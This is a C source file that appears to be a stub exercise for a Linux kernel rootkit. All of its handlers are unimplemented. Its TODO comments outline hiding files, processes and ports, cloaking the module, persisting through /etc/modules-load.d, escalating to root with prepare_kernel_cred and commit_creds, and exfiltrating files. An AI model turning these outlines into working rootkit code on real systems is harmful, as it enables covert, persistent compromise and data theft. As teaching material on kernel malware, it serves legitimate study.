// SPDX-License-Identifier: GPL-2.0
//
// Command handlers: all rootkit operations.
//
// Query, hide/unhide targets, module cloaking, persistence,
// privilege escalation, and file exfiltration. Every response
// goes through the AEAD sealed channel via RK_REPLY.
//
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/sched/task.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/utsname.h>

#include "rootkit.h"

// ---- generic hide/unhide for string targets ----

int rk_cmd_hide_target(struct rk_session *s,
		       struct rk_target_list *list, const char *value)
{
	// TODO: rk_target_add, reply "full\n" / "too long\n" / "hidden\n"
	return -ENOSYS;
}

int rk_cmd_unhide_target(struct rk_session *s,
			 struct rk_target_list *list, const char *value)
{
	// TODO: rk_target_remove, reply "not found\n" / "unhidden\n"
	return -ENOSYS;
}

// ---- simple query commands ----

int rk_cmd_ping(struct rk_session *s)
{
	// TODO: RK_REPLY "PONG\n"
	return -ENOSYS;
}

int rk_cmd_info(struct rk_session *s)
{
	// TODO: utsname() fields, snprintf into buf, rk_send_sealed
	return -ENOSYS;
}

int rk_cmd_status(struct rk_session *s)
{
	// TODO: Report counts from target lists, cloaked/persisted flags
	return -ENOSYS;
}

int rk_cmd_list(struct rk_session *s, const char *category)
{
	// TODO: Dispatch on category string (FILE, PID, CONTENT, PORT),
	// iterate under lock, send each entry sealed
	return -ENOSYS;
}

int rk_cmd_unhide_all(struct rk_session *s)
{
	// TODO: Zero all 4 target list counts under their locks
	return -ENOSYS;
}

// ---- port-specific hide/unhide ----

int rk_cmd_hide_port(struct rk_session *s, const char *arg)
{
	// TODO: kstrtou16, validate non-zero, rk_port_add
	return -ENOSYS;
}

int rk_cmd_unhide_port(struct rk_session *s, const char *arg)
{
	// TODO: kstrtou16, validate non-zero, rk_port_remove
	return -ENOSYS;
}

// ---- module cloaking ----

int rk_cmd_hide_module(struct rk_session *s)
{
	// TODO: If already hidden reply so; else rk_cloak_module
	return -ENOSYS;
}

int rk_cmd_unhide_module(struct rk_session *s)
{
	// TODO: If already visible reply so; else rk_uncloak_module
	return -ENOSYS;
}

// ---- persistence via filp_open + kernel_write ----

int rk_cmd_persist(struct rk_session *s)
{
	// TODO: filp_open /etc/modules-load.d/rklings.conf (O_WRONLY|O_CREAT|O_TRUNC),
	// kernel_write "rklings\n", filp_close, set rk_persist_active
	return -ENOSYS;
}

int rk_cmd_unpersist(struct rk_session *s)
{
	// TODO: call_usermodehelper to rm the conf file, clear flag
	return -ENOSYS;
}

// ---- privilege escalation ----

int rk_cmd_escalate(struct rk_session *s)
{
	// TODO: prepare_kernel_cred(&init_task) + commit_creds
	return -ENOSYS;
}

// ---- file exfiltration ----

int rk_cmd_download(struct rk_session *s, const char *path)
{
	// TODO: filp_open(path, O_RDONLY), loop kernel_read + rk_send_sealed,
	// filp_close, send trailing newline
	return -ENOSYS;
}
